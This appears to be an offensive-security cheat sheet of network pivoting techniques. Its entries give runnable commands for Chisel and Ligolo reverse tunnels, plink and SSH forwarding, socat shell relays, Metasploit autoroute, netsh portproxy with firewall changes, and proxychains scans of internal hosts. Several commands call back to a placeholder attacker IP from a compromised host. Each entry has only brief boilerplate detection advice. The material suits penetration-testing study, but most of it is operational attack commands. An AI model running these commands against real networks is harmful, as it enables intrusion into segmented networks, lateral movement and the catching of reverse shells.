label: Chisel Client (Reverse SOCKS Connect)
command:
# Connects to the attacker's Chisel server and requests it to open SOCKS proxy port 1080
./chisel client <Attacker-IP>:8000 R:socks
description:
Executes the Chisel client on the compromised internal host, connecting back to the attacker and opening a remote SOCKS proxy into the internal network.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: chisel.md
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: Chisel Local Port Forwarding (Client)
command:
# Binds attacker port 3306 to internal DB IP 10.10.10.5:3306
./chisel client <Attacker-IP>:8000 R:3306:10.10.10.5:3306
description:
Uses Chisel to forward a specific port on the internal network back to the attacker, avoiding full SOCKS proxying.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: chisel.md
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: Chisel Server (Reverse SOCKS Setup)
command:
# Starts the Chisel server on port 8000, allowing reverse port forwarding tunnels.
./chisel server -p 8000 --reverse
description:
Sets up the Chisel server on the attacker machine to listen for incoming connections from a compromised host, enabling a reverse SOCKS tunnel.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: Ligolo-ng Agent Execution
command:
# Connect the agent to the attacker's running proxy
./agent -connect <Attacker-IP>:11601 -ignore-cert
description:
Executes the Ligolo agent on the compromised host to connect back to the attacker's proxy listener over a multiplexed, TLS-encrypted connection.

This technique is categorized as a high-value network pivoting action.

label: Ligolo-ng IP Route Addition
command:
# From within the Ligolo interactive proxy CLI:
session
start

# From the Attacker Unix Terminal: Add route to internal subnet
sudo ip route add 10.20.0.0/24 dev ligolo
description:
Modifies the attacker's local routing table to push traffic for the internal subnet directly through the Ligolo TUN interface.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: Ligolo-ng Proxy/Server Setup (TUN Interface)
command:
# Create the TUN interface
sudo ip tuntap add user <your-user> mode tun ligolo
sudo ip link set ligolo up

# Start the ligolo-ng proxy listener
./proxy -selfcert
description:
Initializes the Ligolo-ng proxy server by setting up a dedicated TUN network interface on the attacker machine for pure IP-level VPN routing.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: Metasploit Autoroute / SOCKS Proxy Setup
command:
# From Metasploit Framework:
run post/multi/manage/autoroute
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
description:
Leverages an established Meterpreter session to automatically route Metasploit modules into the internal network and expose it as a SOCKS proxy.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: Plink.exe Remote Port Forwarding (Windows -> Linux)
command:
# Connects to Attacker-IP, logs in via SSH, and opens port 4444 on the attacker
plink.exe -ssh -l <username> -pw <password> -R 4444:127.0.0.1:445 <Attacker-IP>
description:
Uses PuTTY's command-line interface (`plink.exe`) to establish a reverse SSH tunnel from a Windows victim to an attacker's SSH server.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: payloadsallthethings-pivoting.md
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: Proxychains Configuration
command:
# Ensure proxychains is configured to use the Chisel / SSH socks proxy:
sed -i 's/^socks4/#socks4/' /etc/proxychains.conf
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

# Execute tools through the tunnel:
proxychains -q nmap -Pn -sT -p 135,445 10.20.0.5
description:
Modifies the `/etc/proxychains.conf` file to route standard command-line tools (Nmap, CrackMapExec) through an established SOCKS proxy.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: payloadsallthethings-pivoting.md
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: SSH Dynamic Port Forwarding (-D / SOCKS)
command:
# Creates a SOCKS proxy listening on 1080/tcp locally.
ssh -N -f -D 1080 <user>@<Pivot-IP>
description:
Creates a dynamic SOCKS proxy on the attacker's local machine that routes all traffic through the SSH connection. Combining with Proxychains enables full network scanning.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: SSH Jump Host (ProxyJump flag)
command:
# SSH directly to the InternalTarget by jumping transparently through the DMZHost
ssh -J <jump-user>@<DMZHost-IP> <target-user>@<InternalTarget-IP>
description:
An extremely clean way to SSH transparently through one or multiple pivot boxes using OpenSSH's modern `-J` flag.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: SSH Local Port Forwarding (-L)
command:
# Connects to Pivot-IP via SSH. Maps Attacker:8080 to Target-IP:80 through Pivot-IP.
ssh -N -L 8080:<Target-IP>:80 <user>@<Pivot-IP>
description:
Forwards a local port on the attacker machine to a remote port on the target network through an SSH pivot host. Useful for accessing internal services like databases or web servers.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: payloadsallthethings-pivoting.md (SSH section)
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: SSH Remote Port Forwarding (-R)
command:
# Connects to Pivot-IP via SSH. Opens port 9042 on Pivot-IP, forwarding traffic back to Attacker's port 4444.
ssh -N -R 9042:127.0.0.1:4444 <user>@<Pivot-IP>
description:
Forwards a remote port on the SSH server (pivot) back to a local port on the attacker machine. Often used to catch reverse shells traversing firewalls.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: payloadsallthethings-pivoting.md (SSH section)
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: SSHuttle (Transparent Proxy)
command:
# Routes all traffic destined for 10.2.2.0/24 through the pivot jump host
sudo sshuttle -r <user>@<Pivot-IP> 10.2.2.0/24
description:
Acts similar to a VPN, transparently routing all subnet traffic through an SSH pivot without requiring Proxychains. Needs root privileges to modify iptables locally.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.

label: Socat Reverse Shell Relay (Listen -> Listen)
command:
# Listens on 8000 to catch the shell, binds to 9000 to wait for the attacker
socat TCP4-LISTEN:8000 TCP4-LISTEN:9000
description:
Uses Socat to catch a reverse shell from a deeply nested internal subnet and relay it back to the attacker machine.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: Socat TCP Port Forwarding (Listen -> Connect)
command:
# Listens on 8080 and forwards traffic to 10.10.10.5:80
socat TCP4-LISTEN:8080,fork TCP4:10.10.10.5:80
description:
Uses Socat as a relay on a pivot host to bind a local listening port and forward all incoming connections to a destination port.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.

label: Windows Netsh Portproxy
command:
# Forwards traffic hitting the pivot on 4545 to the attacker's IP on 4545
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=<Attacker-IP> connectport=4545

# Open local firewall to allow the connection
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
description:
The native "Living off the Land" technique for port forwarding on modern Windows endpoints without uploading custom tools. Requires local Administrator privileges.

This technique is categorized as a high-value network pivoting action.

  1. What attacker gains: The ability to route traffic into an otherwise inaccessible internal network segment or capture reverse shells.
  2. Attack pre-requisite: Administrative access or the ability to execute tunneling binaries on the compromised jump host.
  • Source: payloadsallthethings-pivoting.md
  • Detection/Defense opsec: Monitor endpoints for unexpected long-lived network tunnels to foreign IPs. Implement network segmentation and Deep Packet Inspection (DPI) to identify encrypted SOCKS/SSH tunneling traffic on non-standard ports.
